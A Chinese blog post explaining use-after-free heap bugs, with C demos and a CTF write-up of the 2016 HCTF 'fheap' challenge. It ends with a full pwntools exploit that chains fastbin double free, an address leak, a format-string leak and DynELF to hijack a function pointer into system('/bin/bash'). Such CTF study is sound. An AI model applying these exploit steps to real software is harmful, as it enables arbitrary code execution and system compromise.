---
title: UAF (Use After Free)漏洞分析及利用
tags: [Linux]
date: 2017-06-23 00:20
---
因为大作业的需求要调试一个浏览器的UAF漏洞，首先必须对UAF漏洞有个整体的了解，本篇文章主要讲解UAF造成的原因以及利用方法，这里结合2016年HCTF fheap
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><blockquote>
<p>因为大作业的需求要调试一个浏览器的UAF漏洞，首先必须对UAF漏洞有个整体的了解，本篇文章主要讲解UAF造成的原因以及利用方法，这里结合2016年HCTF fheap <br>
  题目分析起来还是有点耐人寻味。</br></p>
</blockquote>
<h1 id="0x01-uaf-原理">0x01 UAF 原理</h1>
<p>这里首先放一段简单的c代码，让大家更容易理解（linux 环境）</p>
<pre class="prettyprint"><code class=" hljs cpp"><span class="hljs-preprocessor">#include &lt;stdio.h&gt;</span>
<span class="hljs-preprocessor">#include &lt;cstdlib&gt;</span>
<span class="hljs-preprocessor">#include &lt;string.h&gt;</span>
<span class="hljs-keyword">int</span> main()
{
    <span class="hljs-keyword">char</span> *p1;
    p1 = (<span class="hljs-keyword">char</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>)*<span class="hljs-number">10</span>);<span class="hljs-comment">//申请内存空间</span>
    <span class="hljs-built_in">memcpy</span>(p1,<span class="hljs-string">"hello"</span>,<span class="hljs-number">10</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"p1 addr:%x,%s\n"</span>,p1,p1);
    <span class="hljs-built_in">free</span>(p1);<span class="hljs-comment">//释放内存空间</span>
    <span class="hljs-keyword">char</span> *p2;
    p2 = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>)*<span class="hljs-number">10</span>);<span class="hljs-comment">//二次申请内存空间，与第一次大小相同，申请到了同一块内存</span>
    <span class="hljs-built_in">memcpy</span>(p1,<span class="hljs-string">"world"</span>,<span class="hljs-number">10</span>);<span class="hljs-comment">//对内存进行修改</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"p2 addr:%x,%s\n"</span>,p2,p1);<span class="hljs-comment">//验证</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre>
<p>如上代码所示</p>
<blockquote>
<p>1.指针p1申请内存，打印其地址值 <br>
  2.然后释放p1 <br>
  3.指针p2申请同样大小的内存，打印p2的地址，p1指针指向的值</br></br></p>
</blockquote>
<p>Gcc编译，运行结果如下： <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170622235950792?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
p1与p2地址相同，p1指针释放后，p2申请相同的大小的内存，操作系统会将之前给p1的地址分配给p2，修改p2的值，p1也被修改了。</br></img></br></p>
<p>重温程序，看注释</p>
<hr>
<p><strong>根本原因</strong></p>
<blockquote>
<p>应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</p>
</blockquote>
<p>简单讲就是第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。</p>
<h1 id="0x02-漏洞的简单利用">0x02 漏洞的简单利用</h1>
<p>还是先放一段程序（linux x86）</p>
<pre class="prettyprint"><code class=" hljs cpp"><span class="hljs-preprocessor">#include &lt;stdio.h&gt;</span>
<span class="hljs-preprocessor">#include &lt;stdlib.h&gt;</span>
<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">void</span> (*func_ptr)(<span class="hljs-keyword">char</span> *);
<span class="hljs-keyword">void</span> evil_fuc(<span class="hljs-keyword">char</span> command[])
{
system(command);
}
<span class="hljs-keyword">void</span> echo(<span class="hljs-keyword">char</span> content[])
{
<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>,content);
}
<span class="hljs-keyword">int</span> main()
{
    func_ptr *p1=(func_ptr*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">4</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"malloc addr: %p\n"</span>,p1);
    p1[<span class="hljs-number">3</span>]=echo;
    p1[<span class="hljs-number">3</span>](<span class="hljs-string">"hello world\n"</span>);
    <span class="hljs-built_in">free</span>(p1); <span class="hljs-comment">//在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span>
    p1[<span class="hljs-number">3</span>](<span class="hljs-string">"hello again\n"</span>); <span class="hljs-comment">//p1指针未被置空,虽然free了,但仍可使用.</span>
    func_ptr *p2=(func_ptr*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">4</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<span class="hljs-comment">//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"malloc addr: %p\n"</span>,p2);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"malloc addr: %p\n"</span>,p1);<span class="hljs-comment">//p2与p1指针指向的内存为同一地址</span>
    p2[<span class="hljs-number">3</span>]=evil_fuc; <span class="hljs-comment">//在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.</span>
    p1[<span class="hljs-number">3</span>](<span class="hljs-string">"/bin/sh"</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre>
<p>运行效果 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170623001441464?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
最后成功获取shell <br>
具体的解释注释里面很清楚，详见注释</br></br></img></br></p>
<h1 id="0x03-2016hctf-fheap">0x03 2016HCTF fheap</h1>
<p>用了一天的时间调试程序，这里参考了FlappyPig与官方的详细题解，但是总觉的说的不够清楚，有些地方理所当然，作为小白根本看不懂。结合着自己的漏洞调试经验写出详细的分析过程，供大家参考。</p>
<h2 id="0x1-题目分析">0x1 题目分析</h2>
<p>整个题目做下来利用到了很多知识点，这里列举一下</p>
<ol>
<li>UAF 二次释放&amp; fastbin的特性</li>
<li>64位格式化字符串漏洞</li>
<li>无libc地址泄露，DynELF</li>
</ol>
<p>主要运用的就是以上三点，首先寻找UAF可执行任意函数漏洞，其次利用puts函数寻找基址，接着利用printf格式化字符串进行内存泄露，最后UAF执行system函数</p>
<h2 id="0x2-申请释放-代码">0x2 申请&amp;释放 代码</h2>
<p>在编写的时候注意，输入顺序，利用recvuntil控制输入流程</p>
<pre class="prettyprint"><code class=" hljs python">申请代码 
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">(size,content)</span>:</span>
    p.recvuntil(<span class="hljs-string">"quit"</span>)
    p.send(<span class="hljs-string">"create "</span>)
    p.recvuntil(<span class="hljs-string">"size:"</span>)
    p.send(str(size)+<span class="hljs-string">'\n'</span>)
    p.recvuntil(<span class="hljs-string">'str:'</span>)
    p.send(content)
    p.recvuntil(<span class="hljs-string">'\n'</span>)[:-<span class="hljs-number">1</span>]

释放代码
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>
    p.recvuntil(<span class="hljs-string">"quit"</span>)
    p.send(<span class="hljs-string">"delete "</span>)
    p.recvuntil(<span class="hljs-string">'id:'</span>)
    p.send(str(idx)+<span class="hljs-string">'\n'</span>)
    p.recvuntil(<span class="hljs-string">'sure?:'</span>)
    p.send(<span class="hljs-string">'yes '</span>+<span class="hljs-string">'\n'</span>)</code></pre>
<h2 id="0x3-uaf漏洞查找">0x3 UAF漏洞查找</h2>
<blockquote>
<p>程序自己实现了一套管理字符串的体系，但是在释放的时候用指针是否为空来判断该索引代表地方是否存放有字符串，如果指针不空，表示可以释放。但是释放完后，没有将指针置空，因此导致<strong>可以二次释放，多次释放</strong>。</p>
</blockquote>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170623012118487?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p>最后在释放内存之后，在delete后并没有置空，存在double free</p>
<h2 id="0x4-利用uaf修改函数地址">0x4 利用UAF修改函数地址</h2>
<p>首先我们了解一下本题的uaf漏洞，这里利用图片的形式展示一下关系</p>
<h3 id="1fastbin特性">1.fastbin特性</h3>
<pre><code>fastbin维护的chunk分九个档次，大小从16字节到80字节，每8个字节一个档次。那我们要求的0x20（32）个字节，属于48字节的档次（因为每个chunk还要加上16字节的管理区），所以我们申请0x20空间后释放的chunk被归到fastbin[5]这个链表中了。
</code></pre>
<h3 id="2内存分布">2.内存分布</h3>
<p><img alt="这里写图片描述" src="http://p6.qhimg.com/t01de9a0cdd0857a62e.png" title=""/></p>
<p>利用gbd动态调试查看结构体内存 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170623102226965?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
最后一个就是freeshort函数指针</br></img></br></p>
<blockquote>
<p>总思路：首先是利用uaf，利用堆块之间申请与释放的步骤，形成对free_func指针的覆盖。从而达到劫持程序流的目的。具体来说，先申请的是三个字符创小于0xf的堆块，并将其释放。此时fastbin中空堆块的单链表结构如下左图，紧接着再申请一个字符串长度为0x20的字符串，此时，申请出来的堆中的数据会如下右图，此时后面申请出来的堆块与之前申请出来的1号堆块为同一内存空间，这时候输入的数据就能覆盖到1号堆块中的free_func指针，指向我们需要执行的函数，随后再调用1号堆块的free_func函数，即实现了劫持函数流的目的。</p>
</blockquote>
<p><img alt="这里写图片描述" src="http://p9.qhimg.com/t015295ad0ff28884c4.png" title=""/></p>
<h2 id="0x5-泄露基址">0x5 泄露基址</h2>
<p>我们要知道堆的释放是一个先入后出的队列，也就是说你第最后一个释放，那么就地一个用，就本体而言首先申请三个堆块 ，其实两个就可以</p>
<pre class="prettyprint"><code class=" hljs sql">    <span class="hljs-operator"><span class="hljs-keyword">create</span>(<span class="hljs-number">4</span>,<span class="hljs-string">'aa'</span>)
    <span class="hljs-keyword">create</span>(<span class="hljs-number">4</span>,<span class="hljs-string">'bb'</span>)
    <span class="hljs-keyword">delete</span>(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">delete</span>(<span class="hljs-number">0</span>)</span></code></pre>
<p>通过调用puts函数打印该函数的地址（一开始我不怎么理解），为什么是覆盖成2d为什么不是1a等其他puts函数的地址，自己调试一下就知道了。</p>
<pre class="prettyprint"><code class=" hljs haskell">    <span class="hljs-typedef"><span class="hljs-keyword">data</span>='a'*0x10+'b'*0x8+'\x2d'#第一次覆盖，泄露出函数地址。</span>
    create(<span class="hljs-number">0x20</span>,<span class="hljs-typedef"><span class="hljs-keyword">data</span>)#在这里连续创建两个堆块，从而使输入的<span class="hljs-keyword">data</span>与前面的块1公用一块内存。个堆块，从而使输入的<span class="hljs-keyword">data</span>与前面的块1公用一块内存。</span>
    delete(<span class="hljs-number">1</span>)#这里劫持函数程序流function puts running
    p.recvuntil('b'*<span class="hljs-number">0x8</span>)
    <span class="hljs-typedef"><span class="hljs-keyword">data</span>=p.recvuntil<span class="hljs-container">('1.')</span>[:-2]</span>
    print <span class="hljs-typedef"><span class="hljs-keyword">data</span></span>
    <span class="hljs-keyword">if</span> len(<span class="hljs-typedef"><span class="hljs-keyword">data</span>)&gt;8:</span>
        <span class="hljs-typedef"><span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>[:8]</span>
    <span class="hljs-typedef"><span class="hljs-keyword">data</span>=u64<span class="hljs-container">(<span class="hljs-title">data</span>.<span class="hljs-title">ljust</span>(8,'\<span class="hljs-title">x00'</span>)</span>)-0xA000000000000 #这里减掉的数可能不需要，自行调整</span>
    print hex(<span class="hljs-typedef"><span class="hljs-keyword">data</span>)</span>
    proc_base=<span class="hljs-typedef"><span class="hljs-keyword">data</span>-0xd2d</span>
    print <span class="hljs-string">"proc base"</span>,hex(proc_base)</code></pre>
<p>找到了plt表的基地址，下面就是对于格式化字符串的利用</p>
<h2 id="6格式化字符串">6.格式化字符串</h2>
<p>我们想要知道system的地址，在没有libc的环境下，利用格式化字符串泄露内存地址从而得到system的加载地址</p>
<p>格式化字符串的洞，一开始不知道怎么发现的。但想了一下，格式化字符串的洞必须满足以下条件， <br>
1. 用户的输入必须能打印 <br>
2. 用户输入的字符串在printf函数栈的上方（先压栈）</br></br></p>
<p>就这两个条件我们很快可以分析出漏洞的点就在create &amp; delete 函数 <br>
我们首先create字符串调用delete 此时freeshort地址变成了printf，可以控制打印 <br>
但是我们的参数放在哪里呢？ <br>
我们又发现当输入yes时yes字符串在堆栈的位置正好是printf的上方</br></br></br></p>
<p>下面找一下printf的偏移 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170623110422476?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<p>64位的格式化字符串 <a href="http://blog.csdn.net/qq_31481187/article/details/72510875">参见我的另一篇博客</a> <br>
找到偏移是9 <br>
这时编写leak函数</br></br></p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span><span class="hljs-params">(addr)</span>:</span>
    delete_str(<span class="hljs-number">0</span>)
    payload = <span class="hljs-string">'a%9$s'</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">'#'</span>) + p64(printf_addr)
    create_str(<span class="hljs-number">0x20</span>,payload)
    sh.recvuntil(<span class="hljs-string">"quit"</span>)
    sh.send(<span class="hljs-string">"delete "</span>)    
    sh.recvuntil(<span class="hljs-string">"id:"</span>)
    sh.send(str(<span class="hljs-number">1</span>)+<span class="hljs-string">'\n'</span>)
    sh.recvuntil(<span class="hljs-string">"?:"</span>)
    sh.send(<span class="hljs-string">"yes.1111"</span>+p64(addr)+<span class="hljs-string">"\n"</span>)  
    sh.recvuntil(<span class="hljs-string">'a'</span>)
    data = sh.recvuntil(<span class="hljs-string">'####'</span>)[:-<span class="hljs-number">4</span>]
    <span class="hljs-keyword">if</span> len(data) == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'\x00'</span>
    <span class="hljs-keyword">if</span> len(data) &lt;= <span class="hljs-number">8</span>:
        <span class="hljs-keyword">print</span> hex(u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)))
    <span class="hljs-keyword">return</span> data</code></pre>
<h2 id="0x7-泄露system地址并使用">0x7 泄露system地址并使用</h2>
<pre class="prettyprint"><code class=" hljs oxygene">     #<span class="hljs-keyword">step</span> <span class="hljs-number">5</span> leak system addr
    create_str(<span class="hljs-number">0</span>x20,payload)
    delete_str(<span class="hljs-number">1</span>)#this one can <span class="hljs-keyword">not</span> be ignore because DynELF use the delete_str() at <span class="hljs-keyword">begin</span>     
    d = DynELF(leak, base_addr, elf=ELF(<span class="hljs-string">'./pwn-f'</span>))
    system_addr = d.lookup(<span class="hljs-string">'system'</span>, <span class="hljs-string">'libc'</span>)
    print <span class="hljs-string">'system_addr:'</span>+hex(system_addr)

    #<span class="hljs-keyword">step</span> <span class="hljs-number">6</span> recover <span class="hljs-keyword">old</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">to</span> <span class="hljs-title">system</span> <span class="hljs-title">then</span> <span class="hljs-title">get</span> <span class="hljs-title">shell</span>
    <span class="hljs-title">delete_str</span><span class="hljs-params">(0)</span>
    <span class="hljs-title">create_str</span><span class="hljs-params">(0x20,<span class="hljs-string">'/bin/bash;'</span>.ljust(0x18,<span class="hljs-string">'#'</span>)</span>+<span class="hljs-title">p64</span><span class="hljs-params">(system_addr)</span>)#<span class="hljs-title">attention</span> /<span class="hljs-title">bin</span>/<span class="hljs-title">bash</span>;</span> i don`t <span class="hljs-keyword">not</span> why <span class="hljs-keyword">add</span> the <span class="hljs-string">';'</span>
    delete_str(<span class="hljs-number">1</span>)
    sh.interactive()</code></pre>
<h2 id="0x8-完整代码">0x8 完整代码</h2>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
sh = process(<span class="hljs-string">'./pwn-f'</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_str</span><span class="hljs-params">(size,str1)</span>:</span>
    sh.recvuntil(<span class="hljs-string">"quit"</span>)
    sh.send(<span class="hljs-string">"create "</span>)
    sh.recvuntil(<span class="hljs-string">"size:"</span>)
    sh.send(str(size)+<span class="hljs-string">'\n'</span>)
    sh.recvuntil(<span class="hljs-string">"str:"</span>)
    sh.send(str1)<span class="hljs-comment">#here why can not i user '\n'</span>
    <span class="hljs-comment"># print '|',sh.recvuntil('\n')[:-1],'|'</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_str</span><span class="hljs-params">(idn)</span>:</span>
    sh.recvuntil(<span class="hljs-string">"quit"</span>)
    sh.send(<span class="hljs-string">"delete "</span>)
    sh.recvuntil(<span class="hljs-string">"id:"</span>)
    sh.send(str(idn)+<span class="hljs-string">'\n'</span>)
    sh.recvuntil(<span class="hljs-string">"?:"</span>)
    sh.send(<span class="hljs-string">"yes"</span>+<span class="hljs-string">"\n"</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span><span class="hljs-params">(addr)</span>:</span>
    delete_str(<span class="hljs-number">0</span>)
    payload = <span class="hljs-string">'a%9$s'</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">'#'</span>) + p64(printf_addr)
    create_str(<span class="hljs-number">0x20</span>,payload)
    sh.recvuntil(<span class="hljs-string">"quit"</span>)
    sh.send(<span class="hljs-string">"delete "</span>)    
    sh.recvuntil(<span class="hljs-string">"id:"</span>)
    sh.send(str(<span class="hljs-number">1</span>)+<span class="hljs-string">'\n'</span>)
    sh.recvuntil(<span class="hljs-string">"?:"</span>)
    sh.send(<span class="hljs-string">"yes.1111"</span>+p64(addr)+<span class="hljs-string">"\n"</span>)  
    sh.recvuntil(<span class="hljs-string">'a'</span>)
    data = sh.recvuntil(<span class="hljs-string">'####'</span>)[:-<span class="hljs-number">4</span>]
    <span class="hljs-keyword">if</span> len(data) == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'\x00'</span>
    <span class="hljs-keyword">if</span> len(data) &lt;= <span class="hljs-number">8</span>:
        <span class="hljs-keyword">print</span> hex(u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)))
    <span class="hljs-keyword">return</span> data

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">global</span> printf_addr<span class="hljs-comment">#set global printf addr cus leak() use it </span>
    <span class="hljs-comment">#step 1 create &amp; delete</span>
    create_str(<span class="hljs-number">4</span>,<span class="hljs-string">'aa'</span>)
    create_str(<span class="hljs-number">4</span>,<span class="hljs-string">'aa'</span>)
    delete_str(<span class="hljs-number">1</span>)
    delete_str(<span class="hljs-number">0</span>)
    <span class="hljs-comment">#step 2 recover old function addr</span>
    pwn = ELF(<span class="hljs-string">'./pwn-f'</span>)
    payload = <span class="hljs-string">"aaaaaaaa"</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">'b'</span>)+<span class="hljs-string">'\x2d'</span><span class="hljs-comment"># recover low bits,the reason why i choose \x2d is that the system flow decide by</span>
    create_str(<span class="hljs-number">0x20</span>,payload)
    delete_str(<span class="hljs-number">1</span>)
    <span class="hljs-comment">#step 3 leak base addr</span>
    sh.recvuntil(<span class="hljs-string">'b'</span>*<span class="hljs-number">0x10</span>)
    data = sh.recvuntil(<span class="hljs-string">'\n'</span>)[:-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">if</span> len(data)&gt;<span class="hljs-number">8</span>:
        data=data[:<span class="hljs-number">8</span>]    
    data = u64(data.ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">'\x00'</span>))<span class="hljs-comment"># leaked puts address use it to calc base addr</span>
    base_addr = data - <span class="hljs-number">0xd2d</span>
    <span class="hljs-comment">#step 4 get printf func addr</span>
    printf_offset = pwn.plt[<span class="hljs-string">'printf'</span>]
    printf_addr = base_addr + printf_offset <span class="hljs-comment">#get real printf addr</span>
    delete_str(<span class="hljs-number">0</span>)
    <span class="hljs-comment">#step 5 leak system addr</span>
    create_str(<span class="hljs-number">0x20</span>,payload)
    delete_str(<span class="hljs-number">1</span>)<span class="hljs-comment">#this one can not be ignore because DynELF use the delete_str() at begin     </span>
    d = DynELF(leak, base_addr, elf=ELF(<span class="hljs-string">'./pwn-f'</span>))
    system_addr = d.lookup(<span class="hljs-string">'system'</span>, <span class="hljs-string">'libc'</span>)
    <span class="hljs-keyword">print</span> <span class="hljs-string">'system_addr:'</span>+hex(system_addr)

    <span class="hljs-comment">#step 6 recover old function to system then get shell</span>
    delete_str(<span class="hljs-number">0</span>)
    create_str(<span class="hljs-number">0x20</span>,<span class="hljs-string">'/bin/bash;'</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">'#'</span>)+p64(system_addr))<span class="hljs-comment">#attention /bin/bash; i don`t not why add the ';'</span>
    delete_str(<span class="hljs-number">1</span>)
    sh.interactive()
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    <span class="hljs-keyword">print</span> <span class="hljs-number">1</span>
    main()</code></pre></hr></div>